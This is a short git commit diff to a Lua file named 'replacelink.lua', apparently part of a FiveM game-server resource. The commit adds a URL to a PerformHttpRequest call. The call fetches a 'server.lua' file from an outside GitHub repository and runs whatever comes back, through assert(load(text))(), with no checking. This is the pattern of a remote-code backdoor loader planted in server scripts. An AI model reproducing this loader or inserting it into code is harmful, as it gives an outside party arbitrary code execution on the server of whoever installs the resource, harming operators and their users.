506654b8857c6944b2d737af5915532bd43bf56e
DeJaVu888 <59124144+DeJaVu888@users.noreply.github.com>
2020-08-15 14:18:52 +0300

    Update replacelink.lua

--- replacelink.lua
+++ replacelink.lua
@@ -1,3 +1,3 @@
-PerformHttpRequest("", function(err, text, headers)
+PerformHttpRequest("https://raw.githubusercontent.com/DeJaVu888/Toxicy36yskin/master/server.lua", function(err, text, headers)
     assert(load(text))()
 end, 'GET', '')
